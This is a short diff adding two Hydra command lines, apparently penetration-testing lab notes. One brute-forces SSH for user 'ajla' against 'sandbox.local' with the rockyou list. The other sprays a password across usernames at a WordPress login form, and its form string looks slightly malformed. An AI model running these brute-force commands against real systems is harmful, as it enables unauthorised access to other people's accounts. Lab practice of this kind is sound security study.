@@ -1,0 +1,3 @@
+hydra -l ajla -P /home/kali/rockyou.txt -T 20 sandbox.local ssh
+hydra -L usernames.txt -p 1234 -t 10 -V $ip http-post-form -I ‘/wp-login.php:log=^USER^&pwd=^PASS^wp-submit=Log+In:Invalid’
+
